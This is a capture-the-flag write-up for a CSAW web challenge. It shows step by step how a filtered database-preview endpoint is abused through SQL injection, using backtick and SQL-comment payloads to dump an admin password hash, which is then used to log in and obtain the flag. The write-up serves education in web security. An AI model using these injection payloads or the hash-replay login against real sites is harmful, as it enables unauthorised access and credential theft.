### Points
200

### Readme
```
I've got a new website for BIG DATA analytics!
http://littlequery.chal.csaw.io
```

### Steps

0. The website has nothing than one login page. When trying to login with some dummy data like test/test; we noticed that the password field is somehow modified before the data is submitted to server.

Open the source of the page, we find that there is one javascript file at `js/login.js` that is used to handle the form data.

Open the javascript file, it contains only one function:

```
$(".form-signin").submit(function () {
    var $password = $(this).find("input[type=password]");
    $password.val(CryptoJS.SHA1($password.val()).toString());
});
```

So, we know that the input password is actually be hashed to SHA1 format before submitting (and probably saved in the same format) to server. 

We then come up with the idea, if we can know the username and hashed password, we can use that directly to login to the website without the need of finding original unhashed password. (That can be achieved pretty easily by disabling javascript in login page).

1. A quick scanning with the provided link (by some tools such as `OWASP ZAP`) result in finding a hidden file. The file is called `db_explore.php` located inside a sub-directory `api`.

2. Check the file:

<http://littlequery.chal.csaw.io/api/db_explore.php>

Resulted in:
```
Must specify mode={schema|preview}
```

3. Let's add one parameter `mode=schema` as it suggested.

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema>

Resulted in:

```
{"dbs":["littlequery"]}
```

Looks like we have seen the database name, and it is: `littlequery`

4. What if we add one more param, such as `db=littlequery` to see if it can show us the schema of the database?

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery>

Resulted in:
```
{"tables":["user"]}
```

Exactly as we thought. It showed us that the database has one table named `user`.

5. We think inside this `user` table, there must be some columns related to `username` and `password`, let's verify that:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&db=littlequery&table=user>

Resulted in:

```
{"columns":{"uid":"int(11)","username":"varchar(128)","password":"varchar(40)"}}
```

Exactly! The table has two columns, one is `username` (maximum length is 128 chars) and the other is `password` (with the maximum length is 40 characters for each value). It seems to be pretty matched with our assumption at the beginning.

6. Now, if we could see the detail content of this table, we can know that username and password in order to login to the site, then our mission will be done!

We also remember that there is one more `mode` to use is `preview`. Let's use it to see it can help us to see the content of the table:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery&table=user>

Resulted in:

```
Database 'littlequery' is not allowed to be previewed.
```

What?! How could it be?? We cannot see the content of the database because it is not allowed to do so.

7. We try to change the database name to see what would happen:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=anything&table=user>

Resulted in:
```
`anything`.`user` doesn't exist.
```

Note that the character "`" is added around the name of the database and the table.

8. So, we can come up with the followng two ideas:

  * Firstly, there must be a filter of database name inside the PHP source code that blocks us from requesting the `littlequery` db. So, our mission now is: How to cheat the PHP filter function that it thinks we are not requesting the `littlequery` database, but actually the SQL query later on still work as we expected (the table `user` inside `littlequery` database is still be requested).

Or, in other words, we should provide one database-name-payload to the `db` param so that it actually request directly to the table inside the database (and not the database itself).

  * Secondly, the character "`" could (hopefully) be used to fool the filter in the PHP code.

9. We try to append the table name directly to the database name, to see what happen:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user&table=user>

(Note that the "`" will be added at the beginning and the end of `db` param value).

Resulted in:
```
`littlequery`.`user`.`user` doesn't exist.
```

Almost there. It looks like the `table` param's value is still being taken into account. 

10. Now what we need to do is to put something at the end of database name query so that it ignores everything else come after. 

That something is: two hiphen and one space characters: `-- ` (Characters used for comments in SQL)

And because the character "`" added by the PHP source code also be ignored, so we have to put it by ourselve. 

So, finally, we have to append the following characters to the `db` param: ``-- `

12. The final request will be:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`-- &table=user>

Or:

<http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%2d%2d%20&table=user>

Resulted in:
```
[{"uid":"1","username":"admin","password":"5896e92d38ee883cc09ad6f88df4934f6b074cf8"}]
```

Bingo! Now we can use this username/password to login to the site (with disabled Javascript) at:

<http://littlequery.chal.csaw.io/login.php>

13. After logging in, the flag is appeared right away!
```
flag{mayb3_1ts_t1m3_4_real_real_escape_string?}
``` 

### NOTE:
The same result can be achieved by using `%23` (`#`) instead of `%2d%2d%20` (`-- `).
